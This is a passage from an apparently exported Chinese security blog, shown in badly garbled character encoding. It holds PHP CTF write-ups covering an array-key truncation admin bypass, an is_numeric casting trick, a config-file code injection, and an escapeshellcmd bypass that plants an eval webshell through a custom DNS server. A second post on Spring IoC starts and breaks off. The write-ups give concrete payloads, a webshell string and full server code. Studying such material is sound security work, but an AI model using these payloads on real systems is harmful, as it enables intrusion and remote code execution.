ä¸ºäº†èƒ½ç»§ç»­å¾€ååšï¼Œè¿™é‡Œå°±è¦è¡¥å……ä¸€ä¸ªå…³äº PHP 5.4.30 çš„çŸ¥è¯†ç‚¹äº†ã€‚ ä¸åŒæ•°ç»„ä¹‹é—´æ¯”è¾ƒç”±äºæ•´æ•°é”®æˆªæ–­å¯¼è‡´ç»“æœç›¸åŒ æ•´æ•°keyæˆªæ–­é—®é¢˜å‘ç”Ÿåœ¨zend_hash_compare()å‡½æ•°è¿™é‡Œï¼Œåœ¨æ•°ç»„è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæ•°å­—å‹ä¸‹æ ‡åœ¨æ¯”è¾ƒæ—¶ï¼Œæ˜¯é€šè¿‡å„è‡ªçš„å€¼ç›¸å‡ç»“æœæ¥åˆ¤æ–­çš„ï¼Œå€¼æ˜¯å­˜æ”¾åœ¨bucketç±»å‹çš„hã€‚é€šè¿‡åˆ¤æ–­ç»“æœæ˜¯å¦ä¸º0å†³å®šæ˜¯å¦ç›¸ç­‰ã€‚ç„¶è€Œï¼Œhçš„æ•°æ®ç±»å‹bucketè¢«å®šä¹‰ä¸ºunsigned longï¼Œåœ¨64ä½ç³»ç»Ÿä¸­ï¼Œé€šå¸¸æ˜¯64ä½ï¼Œä½†æ˜¯resultå˜é‡å´åªæ˜¯32ä½intç±»å‹ã€‚å› æ­¤ï¼Œå½“æ¯”è¾ƒç»“æœçš„ä½32ä½å…¨æ˜¯0çš„è¯ï¼Œæ¯”è¾ƒç»“æœä¼šæ˜¯ç›¸ç­‰ã€‚å› æ­¤ï¼Œkey=0å’Œkey=4294967296(0x10000000)ä»¥åŠå…¶ä»–çš„keyéƒ½è¢«è®¤ä¸ºç›¸ç­‰ã€‚ ä¹Ÿå°±æ˜¯è¯´ 1arr[0] =&gt; 1 === arr[4294967296] =&gt; 1 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©ç”¨æˆ· 5 ä¼ªé€ æˆç”¨æˆ· 0 ç™»å½•ï¼Œæˆ‘ä»¬ä¿®æ”¹ Cookie 1Cookie:user[4294967296]=5;user[1]=hund; æ­¤æ—¶çš„ $input 1[4294967296 =&gt; &quot;5&quot;,1 =&gt; &quot;hund&quot;] åˆ¤æ–­ $input === $user æ—¶ï¼Œä¼šæŠŠ input[4294967296] çœ‹æˆ **input[0]**ï¼ŒæˆåŠŸè¿›å…¥ if é‡Œé¢ï¼Œå› ä¸º$input[0]å¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥å½“å…¶åŠ ä¸Š0æ—¶ï¼Œç»“æœä¸º0ã€‚è¿™æ—¶ï¼Œç”¨æˆ·èº«ä»½å°±ä»ç”¨æˆ·5å˜æˆäº†ç”¨æˆ·0ï¼Œadminèº«ä»½ã€‚ è¿™é‡Œå¤ç°è¦ä¸‹è½½å¯¹åº”çš„ php ç‰ˆæœ¬ï¼Œæˆ‘å°±å·ä¸ªæ‡’ç›´æ¥æ‰¾åœ¨çº¿ç¯å¢ƒæµ‹è¯•ã€‚ Online PHP editor | Test code in 250+ PHP versions (3v4l.org) 123456&lt;?php$input = [4294967296 =&gt; &quot;5&quot;,1 =&gt; &#x27;hund&#x27;];$input2 = [0 =&gt; &quot;5&quot;,1 =&gt; &#x27;hund&#x27;];if($input === $input2)&#123; echo &quot;yes&quot;;&#125; å¯ä»¥çœ‹åˆ°åªæœ‰åœ¨ PHP5.4.0-5.4.43,5.5.0-5.5.26,5.6.0-5.6.1 ç‰ˆæœ¬ä¸­æ‰èƒ½ä»¥adminèº«ä»½ç™»å½• å½±å“èŒƒå›´PHP5.4.0-5.4.43,5.5.0-5.5.26,5.6.0-5.6.1 0x00021234567891011121314151617&lt;?phpshow_source(__FILE__);$flag = &quot;xxxx&quot;;if(isset($_GET[&#x27;time&#x27;]))&#123; if(!is_numeric($_GET[&#x27;time&#x27;]))&#123; echo &#x27;The time must be number.&#x27;; &#125;else if($_GET[&#x27;time&#x27;] &lt; 60 * 60 * 24 * 30 * 2)&#123; echo &#x27;This time is too short.&#x27;; &#125;else if($_GET[&#x27;time&#x27;] &gt; 60 * 60 * 24 * 30 * 3)&#123; echo &#x27;This time is too long.&#x27;; &#125;else&#123; sleep((int)$_GET[&#x27;time&#x27;]); echo $flag; &#125; echo &#x27;&lt;hr&gt;&#x27;; &#125;?&gt; 1234&gt;&gt;&gt; 60 * 60 * 24 * 30 * 25184000&gt;&gt;&gt; 60 * 60 * 24 * 30 * 37776000 è¦ç»•è¿‡å‰é¢ä¸¤ä¸ª if å¾ˆç®€å•ï¼Œä½†æ˜¯åé¢ç­‰å¾…çš„æ—¶é—´ä¼šå¾ˆé•¿ï¼Œis_numeric å¯ä»¥è¯†åˆ«æ”¯æŒæ™®é€šæ•°å­—å‹å­—ç¬¦ä¸²ã€ç§‘å­¦è®°æ•°æ³•å‹å­—ç¬¦ä¸²ã€éƒ¨åˆ†æ”¯æŒåå…­è¿›åˆ¶0xå‹å­—ç¬¦ä¸²ã€‚è€Œå¼ºåˆ¶ç±»å‹è½¬æ¢intï¼Œä¸èƒ½æ­£ç¡®è½¬æ¢çš„ç±»å‹æœ‰åå…­è¿›åˆ¶å‹å­—ç¬¦ä¸²ã€ç§‘å­¦è®¡æ•°æ³•å‹å­—ç¬¦ä¸²ï¼ˆéƒ¨åˆ†ï¼‰ æ¯”å¦‚ 1echo (int)&quot;6e6&quot;; è¾“å‡ºçš„ç»“æœæ˜¯ 6ï¼› 1echo (int)&quot;0x4f1a00&quot; è¾“å‡ºç»“æœæ˜¯ 0ï¼› å¦‚æœä½ æƒ³å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ï¼Œåº”è¯¥ä½¿ç”¨ intval å¹¶æŒ‡å®šåŸºæ•°ï¼š 1$intValue = intval(&quot;1A&quot;, 16); // ç»“æœä¸º 26 ç§‘å­¦æŠ€æœ¯æ³•çš„è¯ï¼Œå…ˆè½¬ä¸ºæµ®ç‚¹æ•°å†ç”¨ int 1$intValue = (int)floatval(&quot;1.23e4&quot;); // ç»“æœä¸º 12300 0x0003index.php 123456&lt;?phphighlight_file(__FILE__);$str = addslashes($_GET[&#x27;option&#x27;]);$file = file_get_contents(&#x27;option.php&#x27;);$file = preg_replace(&#x27;|\\$option=\\&#x27;.*\\&#x27;;|&#x27;, &quot;\\$option=&#x27;$str&#x27;;&quot;, $file);file_put_contents(&#x27;option.php&#x27;, $file); option.php 123&lt;?phphighlight_file(__FILE__);$option=&#x27;&#x27;; æµç¨‹å¦‚ä¸‹ï¼š å¯¹ä¼ å…¥çš„optionå‚æ•°è¿›è¡Œaddslashesï¼Œæ¯”å¦‚æœ‰å•å¼•å·&#39;ï¼Œä¼šå˜æˆ\\&#39; é€šè¿‡æ­£åˆ™åŒ¹é…xxxxx&#x2F;option.phpä¸­çš„$option=&#39;xxx&#39;;ï¼Œå°†xxxçš„å†…å®¹æ›¿æ¢ä¸ºç»ç¬¬ä¸€æ­¥å¤„ç†çš„å€¼ æ›¿æ¢å®Œæˆï¼Œå°†å…¶å†™å…¥xxxxx&#x2F;option.phpã€‚ åœºæ™¯ï¼š ç”¨äºå†™å…¥é…ç½®æ–‡ä»¶ç­‰ã€‚ æ³•ä¸€1option=a&#x27;;%0aphpinfo();// ç„¶å 1option=a åˆ©ç”¨çš„æ˜¯ .* çš„æ­£åˆ™åŒ¹é…æ¼æ´ï¼Œç¬¬ä¸€æ¬¡ç»è¿‡ addslashes å‡½æ•°åï¼Œå¾—åˆ° 1a\\&#x27;;%0aphpinfo();// option.php é‡Œå˜æˆ 1234&lt;?phphighlight_file(__FILE__);$option=&#x27;a\\&#x27;;phpinfo();//&#x27;; ç¬¬äºŒæ¬¡è®¿é—® 1option=a ä¼šåŒ¹é…ä¸¤ä¸ªå•å¼•å·1é‡Œçš„å†…å®¹å³ a\\,æ›¿æ¢ä¸º aï¼Œæ­¤æ—¶çš„ option.php é‡Œçš„å†…å®¹å˜ä¸º 1234&lt;?phphighlight_file(__FILE__);$option=&#x27;a&#x27;;phpinfo();//&#x27;; æ³•äºŒ1?option=aaa\\&#x27;;phpinfo();// ç»è¿‡addslashesåï¼Œ$strä¸º aaa\\\\\\&#39;;phpinfo();// ç»è¿‡ preg_replace åä¸‰ä¸ª\\ å˜æˆä¸¤ä¸ª \\, çŒœæµ‹æ˜¯ preg_replace åšäº†è½¬ä¹‰å¤„ç†ã€‚ 0x00041234567891011121314151617181920&lt;?phpheader(&#x27;Content-Type: text/plain&#x27;);$ip = $_GET[&#x27;ip&#x27;] ?? exit;duita($ip);$ip = escapeshellcmd($ip);$ip = str_replace(&#x27;\\&gt;&#x27;, &#x27;&gt;&#x27;, $ip);$ip = str_replace(&#x27;\\&lt;&#x27;, &#x27;&lt;&#x27;, $ip);$cmd = sprintf(&#x27;ping -c 2 %s&#x27;, $ip);echo shell_exec($cmd);function duita($ip)&#123; if (strpbrk($ip, &quot;&amp;;`|*?()$\\\\\\x00&quot;) !== false) &#123; exit(&#x27;WAF&#x27;); &#125; if (stripos($ip, &#x27;.php&#x27;) !== false) &#123; exit(&#x27;WAF&#x27;); &#125;&#125;?&gt; å¯ä»¥å‘ç°è¿™é‡Œæœ‰ä¸¤ä¸ªè€ƒç‚¹ å†™å…¥ webshell ç»•è¿‡ .php æ£€æµ‹ ç»•è¿‡ .php æ£€æµ‹å¾ˆç®€å•ï¼Œæ¥çœ‹ä¸€å®˜æ–¹æ–‡æ¡£é‡Œçš„ escapeshellcmd åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š *&amp;#;&#96;|*?~&lt;&gt;^()[]{}$*, \\x0A å’Œ \\xFFã€‚ â€˜ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ é‡ç‚¹å°±åœ¨äº â€˜ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ï¼Œæ‰€ä»¥å¦‚æœåœ¨é…å¯¹æƒ…å†µä¸‹ï¼Œ bash ä¸­ â€œâ€ æ˜¯ç©ºå­—ç¬¦ä¸²,åœ¨ bash é‡Œ â€œâ€ å°±ä¸ä¼šä¿ç•™äº† shell.ph\"\"p1shell.ph&quot;&quot;p æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆå†™å…¥ shell äº†ã€‚ ping www.baidu.com ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºçš„ç•Œé¢æœ‰ä¸€ä¸ªcnameçš„åœ°å€www.a.shifen.comã€‚å¯æ§ã€‚ ä½¿ç”¨dnspodé…ç½®ç‰¹æ®Šå­—ç¬¦æ— æ•ˆã€‚ å…¶ä½™å¹³å°æœªæµ‹è¯•ï¼Œç„¶åå°è¯•è‡ªå·±æ­å»ºä¸€ä¸ªdnsæœåŠ¡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# coding=utf-8&quot;&quot;&quot;LICENSE http://www.apache.org/licenses/LICENSE-2.0&quot;&quot;&quot;import datetimeimport sysimport timeimport threadingimport tracebackimport socketserverfrom dnslib import *import binascii # ç”¨äºå¤„ç†åå…­è¿›åˆ¶ç¼–ç å’Œè§£ç # å®šä¹‰åŸºæœ¬åŸŸåå’Œ IP åœ°å€TTL = 60 * 5 # å®šä¹‰ç”Ÿå­˜æ—¶é—´ (TTL)ï¼Œå•ä½ä¸ºç§’# å¤„ç† DNS è¯·æ±‚ï¼Œç”Ÿæˆå“åº”def dns_response(data): # è§£æè¯·æ±‚æ•°æ® request = DNSRecord.parse(data) print(request) # æ‰“å°è¯·æ±‚å†…å®¹ # åˆ›å»ºå›å¤æŠ¥æ–‡ï¼Œå¸¦ä¸Šè¯·æ±‚å¤´çš„ ID å’Œç›¸å…³ä¿¡æ¯ reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q) # è·å–è¯·æ±‚çš„åŸŸåå’Œç±»å‹ qname = request.q.qname qn = str(qname) # è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼ qtype = request.q.qtype qt = QTYPE[qtype] # è¯·æ±‚çš„ç±»å‹ï¼ˆå¦‚ Aã€NS ç­‰ï¼‰ # æ£€æŸ¥è¯·æ±‚çš„åŸŸåæ˜¯å¦åŒ¹é… if qn.startswith(&#x27;aaa.dddns.320ctf.fun&#x27;): rdata = CNAME(&#x27;&lt;?=eval($_POST[1])?&gt;.dddns.320ctf.fun&#x27;) reply.add_answer(RR(rname=qname, rtype=5, rclass=1, ttl=TTL, rdata=rdata)) else: rdata = A(&#x27;81.71.96.92&#x27;) reply.add_answer(RR(rname=qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata)) print(&quot;---- Reply: &quot;, reply) # æ‰“å°å›å¤å†…å®¹ return reply.pack() # è¿”å›æ‰“åŒ…åçš„ DNS å“åº”# å®šä¹‰é€šç”¨çš„è¯·æ±‚å¤„ç†ç±»ï¼Œæä¾›è·å–å’Œå‘é€æ•°æ®çš„æŠ½è±¡æ–¹æ³•class BaseRequestHandler(socketserver.BaseRequestHandler): def get_data(self): raise NotImplementedError def send_data(self, data): raise NotImplementedError def handle(self): # è·å–å½“å‰æ—¶é—´ now = datetime.datetime.utcnow().strftime(&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;) print(&quot; %s request %s (%s %s):&quot; % (self.__class__.__name__[:3], now, self.client_address[0], self.client_address[1])) try: # å¤„ç†æ”¶åˆ°çš„ DNS è¯·æ±‚æ•°æ® data = self.get_data() print(len(data), binascii.hexlify(data)) # ä½¿ç”¨ binascii è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç è¾“å‡º # å‘é€ DNS å“åº” self.send_data(dns_response(data)) except Exception: # å¦‚æœå‡ºç°é”™è¯¯ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ traceback.print_exc(file=sys.stderr)# å®šä¹‰ TCP è¯·æ±‚å¤„ç†ç±»class TCPRequestHandler(BaseRequestHandler): def get_data(self): # æ¥æ”¶ TCP æ•°æ®å¹¶æ£€æŸ¥é•¿åº¦ data = self.request.recv(8192).strip() sz = int(binascii.hexlify(data[:2]), 16) # ä½¿ç”¨ binascii è¿›è¡Œåå…­è¿›åˆ¶è§£ç  if sz &lt; len(data) - 2: raise Exception(&quot;Wrong size of TCP packet&quot;) # å¦‚æœæ•°æ®é•¿åº¦é”™è¯¯ï¼ŒæŠ›å‡ºå¼‚å¸¸ elif sz &gt; len(data) - 2: raise Exception(&quot;Too big TCP packet&quot;) # å¦‚æœæ•°æ®è¿‡å¤§ï¼ŒæŠ›å‡ºå¼‚å¸¸ return data[2:] def send_data(self, data): # å‘é€ TCP æ•°æ®æ—¶ï¼Œå…ˆå°†æ•°æ®é•¿åº¦ç¼–ç ä¸º 16 è¿›åˆ¶å¹¶å‘é€ sz = binascii.unhexlify(hex(len(data))[2:].zfill(4)) # ä½¿ç”¨ binascii å°†é•¿åº¦è½¬æ¢ä¸º 16 è¿›åˆ¶ return self.request.sendall(sz + data)# å®šä¹‰ UDP è¯·æ±‚å¤„ç†ç±»class UDPRequestHandler(BaseRequestHandler): def get_data(self): # ç›´æ¥è¿”å›æ¥æ”¶åˆ°çš„ UDP æ•°æ® return self.request[0].strip() def send_data(self, data): # å‘é€ UDP å“åº”æ•°æ® return self.request[1].sendto(data, self.client_address)# ä¸»ç¨‹åºå…¥å£if __name__ == &#x27;__main__&#x27;: print(&quot;Starting nameserver...&quot;) # åˆ›å»º TCP å’Œ UDP æœåŠ¡å™¨ï¼Œç›‘å¬æŒ‡å®šç«¯å£ servers = [ socketserver.ThreadingUDPServer((&#x27;&#x27;, 53), UDPRequestHandler), socketserver.ThreadingTCPServer((&#x27;&#x27;, 53), TCPRequestHandler), ] # ä¸ºæ¯ä¸ªæœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å¹¶å¯åŠ¨ for s in servers: thread = threading.Thread(target=s.serve_forever) # æœåŠ¡å™¨çº¿ç¨‹å°†ä¸ºæ¯ä¸ªè¯·æ±‚åˆ›å»ºæ–°çº¿ç¨‹ thread.daemon = True # ä¸»çº¿ç¨‹é€€å‡ºæ—¶è‡ªåŠ¨ç»ˆæ­¢æœåŠ¡å™¨çº¿ç¨‹ thread.start() print(&quot;%s server loop running in thread: %s&quot; % (s.RequestHandlerClass.__name__[:3], thread.name)) # ä¸»çº¿ç¨‹ä¿æŒè¿è¡Œï¼Œç›´åˆ°æ‰‹åŠ¨ç»ˆæ­¢ try: while 1: time.sleep(1) # æ¯ç§’è¾“å‡ºä¸€æ¬¡çŠ¶æ€ sys.stderr.flush() # åˆ·æ–°æ ‡å‡†é”™è¯¯è¾“å‡º sys.stdout.flush() # åˆ·æ–°æ ‡å‡†è¾“å‡º except KeyboardInterrupt: pass # æ•è· Ctrl+C ä¸­æ–­ finally: # åœæ­¢æœåŠ¡å™¨ for s in servers: s.shutdown() è®°å¾—æŠŠåŸŸåçš„ dns è§£æå…¨å…³äº†ï¼ŒæœåŠ¡å™¨çš„é»˜è®¤ dns ä¹Ÿå…³ ï¼Œè…¾è®¯äº‘çš„ 53 tcp and udp éƒ½è¦æ”¾è¡Œ 12345sudo systemctl disable systemd-resolvedsudo systemctl stop systemd-resolved# å®éªŒç»“æŸåè®°å¾—å¼€å›æ¥sudo systemctl start systemd-resolvedsudo systemctl enable systemd-resolved # å¼€æœºè‡ªåŠ¨å¯åŠ¨ dig ä¸€ä¸‹å¯ä»¥å‘ç° shell è¢«è¿”å›äº† ä½†æ˜¯ ping ä¸€ç›´æ²¡ç»“æœï¼Œéƒ¨åˆ†å…¬å…±dnsä¸å¯èƒ½ ã€‚ ä¼šè¿‡æ»¤è¿™äº›ç‰¹æ®Šç¬¦å·ã€‚ å¯ä»¥ä½¿ç”¨dnspodçš„å…¬å…±dnsæœåŠ¡ã€‚ 119.29.29.29 payload 1ping -c 2 aaa.dddns.320ctf.fun &gt;&gt; 1.ph&quot;&quot;p","tags":["php å®‰å…¨"],"categories":["php å®‰å…¨","ä»£ç å®¡è®¡"]},{"title":"Spring å­¦ä¹ ","path":"/2024/09/05/java/å¼€å‘/Spring/","content":"åå¤©è¦å»å®¡ java ä»£ç å‘¢ï¼Œä¸´æ—¶æŠ±ä½›è„šæŠŠ spring è¿‡ä¸€éå§ 0x01 æ„ä¹‰ç›´æ¥çœ‹ç™¾åº¦ç™¾ç§‘ 1.ä½ä¾µå…¥å¼è®¾è®¡ï¼Œä»£ç æ±¡æŸ“æä½ 2.ç‹¬ç«‹äºå„ç§åº”ç”¨æœåŠ¡å™¨ï¼ŒåŸºäºSpringæ¡†æ¶çš„åº”ç”¨ï¼Œå¯ä»¥çœŸæ­£å®ç°Write Once,Run Anywhereçš„æ‰¿è¯º 3.Springçš„DIæœºåˆ¶é™ä½äº†ä¸šåŠ¡å¯¹è±¡æ›¿æ¢çš„å¤æ‚æ€§ï¼Œæé«˜äº†ç»„ä»¶ä¹‹é—´çš„è§£è€¦ 4.Springçš„AOPæ”¯æŒå…è®¸å°†ä¸€äº›é€šç”¨ä»»åŠ¡å¦‚å®‰å…¨ã€äº‹åŠ¡ã€æ—¥å¿—ç­‰è¿›è¡Œé›†ä¸­å¼ç®¡ç†ï¼Œä»è€Œæä¾›äº†æ›´å¥½çš„å¤ç”¨ 5.Springçš„ORMå’ŒDAOæä¾›äº†ä¸ç¬¬ä¸‰æ–¹æŒä¹…å±‚æ¡†æ¶çš„è‰¯å¥½æ•´åˆï¼Œå¹¶ç®€åŒ–äº†åº•å±‚çš„æ•°æ®åº“è®¿é—® 6.Springå¹¶ä¸å¼ºåˆ¶åº”ç”¨å®Œå…¨ä¾èµ–äºSpringï¼Œå¼€å‘è€…å¯è‡ªç”±é€‰ç”¨Springæ¡†æ¶çš„éƒ¨åˆ†æˆ–å…¨éƒ¨ æ²¡å­¦è¿‡å¼€å‘çŸ¥è¯†å¾—çœ‹åˆ°è¿™å‡ æ¡ä¸€å®šå¾ˆæ‡µï¼ˆå­¦è¿‡ä¸€ä¸ä¸€å®šçœ‹å¾—æ‡‚ï¼Œä¸ç®¡é‚£ä¹ˆå¤šåæ­£å®ƒå¥½ç”¨æˆ‘ä»¬å­¦å°±æ˜¯äº†ï¼ˆåˆæ°´äº†ä¸€äº›å­—æ•° &#x3D;&#x3D;æ€»ç»“ä¸€å¥è¯ï¼šSpringå°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ§åˆ¶åè½¬ï¼ˆIOCï¼‰å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„æ¡†æ¶ï¼&#x3D;&#x3D; 0x02 è®¤è¯†ç»„æˆ Spring æ¡†æ¶æ˜¯ä¸€ä¸ªåˆ†å±‚æ¶æ„ï¼Œç”± 7 ä¸ªå®šä¹‰è‰¯å¥½çš„æ¨¡å—ç»„æˆã€‚Spring æ¨¡å—æ„å»ºåœ¨æ ¸å¿ƒå®¹å™¨ä¹‹ä¸Šï¼Œæ ¸å¿ƒå®¹å™¨å®šä¹‰äº†åˆ›å»ºã€é…ç½®å’Œç®¡ç† bean çš„æ–¹å¼ . ç»„æˆ Spring æ¡†æ¶çš„æ¯ä¸ªæ¨¡å—ï¼ˆæˆ–ç»„ä»¶ï¼‰éƒ½å¯ä»¥å•ç‹¬å­˜åœ¨ï¼Œæˆ–è€…ä¸å…¶ä»–ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—è”åˆå®ç°ã€‚æ¯ä¸ªæ¨¡å—çš„åŠŸèƒ½å¦‚ä¸‹ï¼š æ ¸å¿ƒå®¹å™¨ï¼šæ ¸å¿ƒå®¹å™¨æä¾› Spring æ¡†æ¶çš„åŸºæœ¬åŠŸèƒ½ã€‚æ ¸å¿ƒå®¹å™¨çš„ä¸»è¦ç»„ä»¶æ˜¯ BeanFactoryï¼Œå®ƒæ˜¯å·¥å‚æ¨¡å¼çš„å®ç°ã€‚BeanFactory ä½¿ç”¨æ§åˆ¶åè½¬ï¼ˆIOCï¼‰ æ¨¡å¼å°†åº”ç”¨ç¨‹åºçš„é…ç½®å’Œä¾èµ–æ€§è§„èŒƒä¸å®é™…çš„åº”ç”¨ç¨‹åºä»£ç åˆ†å¼€ã€‚ Spring ä¸Šä¸‹æ–‡ï¼šSpring ä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå‘ Spring æ¡†æ¶æä¾›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚Spring ä¸Šä¸‹æ–‡åŒ…æ‹¬ä¼ä¸šæœåŠ¡ï¼Œä¾‹å¦‚ JNDIã€EJBã€ç”µå­é‚®ä»¶ã€å›½é™…åŒ–ã€æ ¡éªŒå’Œè°ƒåº¦åŠŸèƒ½ã€‚ Spring AOPï¼šé€šè¿‡é…ç½®ç®¡ç†ç‰¹æ€§ï¼ŒSpring AOP æ¨¡å—ç›´æ¥å°†é¢å‘åˆ‡é¢çš„ç¼–ç¨‹åŠŸèƒ½ , é›†æˆåˆ°äº† Spring æ¡†æ¶ä¸­ã€‚æ‰€ä»¥ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ Spring æ¡†æ¶ç®¡ç†ä»»ä½•æ”¯æŒ AOPçš„å¯¹è±¡ã€‚Spring AOP æ¨¡å—ä¸ºåŸºäº Spring çš„åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡æä¾›äº†äº‹åŠ¡ç®¡ç†æœåŠ¡ã€‚é€šè¿‡ä½¿ç”¨ Spring AOPï¼Œä¸ç”¨ä¾èµ–ç»„ä»¶ï¼Œå°±å¯ä»¥å°†å£°æ˜æ€§äº‹åŠ¡ç®¡ç†é›†æˆåˆ°åº”ç”¨ç¨‹åºä¸­ã€‚ Spring DAOï¼šJDBC DAO æŠ½è±¡å±‚æä¾›äº†æœ‰æ„ä¹‰çš„å¼‚å¸¸å±‚æ¬¡ç»“æ„ï¼Œå¯ç”¨è¯¥ç»“æ„æ¥ç®¡ç†å¼‚å¸¸å¤„ç†å’Œä¸åŒæ•°æ®åº“ä¾›åº”å•†æŠ›å‡ºçš„é”™è¯¯æ¶ˆæ¯ã€‚å¼‚å¸¸å±‚æ¬¡ç»“æ„ç®€åŒ–äº†é”™è¯¯å¤„ç†ï¼Œå¹¶ä¸”æå¤§åœ°é™ä½äº†éœ€è¦ç¼–å†™çš„å¼‚å¸¸ä»£ç æ•°é‡ï¼ˆä¾‹å¦‚æ‰“å¼€å’Œå…³é—­è¿æ¥ï¼‰ã€‚Spring DAO çš„é¢å‘ JDBC çš„å¼‚å¸¸éµä»é€šç”¨çš„ DAO å¼‚å¸¸å±‚æ¬¡ç»“æ„ã€‚ Spring ORMï¼šSpring æ¡†æ¶æ’å…¥äº†è‹¥å¹²ä¸ª ORM æ¡†æ¶ï¼Œä»è€Œæä¾›äº† ORM çš„å¯¹è±¡å…³ç³»å·¥å…·ï¼Œå…¶ä¸­åŒ…æ‹¬ JDOã€Hibernate å’Œ iBatis SQL Mapã€‚æ‰€æœ‰è¿™äº›éƒ½éµä» Spring çš„é€šç”¨äº‹åŠ¡å’Œ DAO å¼‚å¸¸å±‚æ¬¡ç»“æ„ã€‚ Spring Web æ¨¡å—ï¼šWeb ä¸Šä¸‹æ–‡æ¨¡å—å»ºç«‹åœ¨åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡æ¨¡å—ä¹‹ä¸Šï¼Œä¸ºåŸºäº Web çš„åº”ç”¨ç¨‹åºæä¾›äº†ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥ï¼ŒSpring æ¡†æ¶æ”¯æŒä¸ Jakarta Struts çš„é›†æˆã€‚Web æ¨¡å—è¿˜ç®€åŒ–äº†å¤„ç†å¤šéƒ¨åˆ†è¯·æ±‚ä»¥åŠå°†è¯·æ±‚å‚æ•°ç»‘å®šåˆ°åŸŸå¯¹è±¡çš„å·¥ä½œã€‚ Spring MVC æ¡†æ¶ï¼šMVC æ¡†æ¶æ˜¯ä¸€ä¸ªå…¨åŠŸèƒ½çš„æ„å»º Web åº”ç”¨ç¨‹åºçš„ MVC å®ç°ã€‚é€šè¿‡ç­–ç•¥æ¥å£ï¼ŒMVC æ¡†æ¶å˜æˆä¸ºé«˜åº¦å¯é…ç½®çš„ï¼ŒMVC å®¹çº³äº†å¤§é‡è§†å›¾æŠ€æœ¯ï¼Œå…¶ä¸­åŒ…æ‹¬ JSPã€Velocityã€Tilesã€iText å’Œ POIã€‚ PSï¼š ç›´æ¥å¤åˆ¶ç‹‚ç¥å¸ˆå‚…çš„ç¬”è®°ï¼Œå¤ªæ™¦æ¶©éš¾æ‡‚äº†ï¼Œæˆ‘è¿˜æ˜¯å…ˆå­¦ä¼šæ€ä¹ˆç”¨å§ï¼Œæ¦‚å¿µè¿™ä¸œè¥¿ç”¨ç€ç”¨ç€å°±ç†è§£äº†ã€‚ IoCåŸºç¡€IoCå…¨ç§° Inversion of Controlï¼Œç›´è¯‘ä¸ºæ§åˆ¶åè½¬ï¼ŒSpring æä¾›çš„å®¹å™¨åˆç§°ä¸º IoC å®¹å™¨ã€‚ æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä»¥å¾€æ­£å¸¸ä¸šåŠ¡çš„æ§åˆ¶æµç¨‹ï¼ŒDAO å’Œ Service å±‚å¯†åˆ‡åˆä½œï¼Œä»¥ç¡®ä¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿé«˜æ•ˆä¸”å¯é åœ°è¿è¡Œ DAO å°±æ˜¯å¤„ç†æ•°æ®åº“æ“ä½œçš„ä¸“å®¶ï¼Œä½ ä¸éœ€è¦å…³å¿ƒå®ƒæ€ä¹ˆå’Œæ•°æ®åº“æ‰“äº¤é“ï¼Œä½ åªéœ€è¦å‘Šè¯‰å®ƒä½ éœ€è¦ä»€ä¹ˆæ•°æ®ï¼Œå®ƒä¼šå¸®ä½ æå®šã€‚ Service å°±æ˜¯ä¸šåŠ¡é€»è¾‘çš„ç®¡ç†è€…ï¼Œå®ƒè´Ÿè´£å¤„ç†ä½ çš„ä¸šåŠ¡éœ€æ±‚ï¼Œæ¯”å¦‚ç”¨æˆ·æ³¨å†Œã€ç™»å½•ç­‰ã€‚Service ä¼šè°ƒç”¨ DAO æ¥è·å–æˆ–ä¿å­˜æ•°æ®ï¼Œä½†å®ƒä¸»è¦å…³æ³¨çš„æ˜¯ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®æ€§ã€‚ æ¯”å¦‚æœ‰ä¸€ä¸ªç”¨æˆ·æŸ¥è¯¢çš„ä¸šåŠ¡éœ€æ±‚ UserDao æ¥å£ 123public interface UserDao &#123; void getUser();&#125; UserDaoImpl å®ç°ç±» 12345public class UserDaoImpl implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;é»˜è®¤è·å–ç”¨æˆ·æ•°æ®&quot;); &#125;&#125; UserService ä¸šåŠ¡æ¥å£ 123public interface UserService &#123; void getUser();&#125; UserServiceImpl ä¸šåŠ¡å®ç°ç±» 12345678public class UserServiceImpl implements UserService &#123; private UserDao userDao = new UserDaoImpl(); public void getUser() &#123; userDao.getUser(); &#125;&#125; æµ‹è¯• 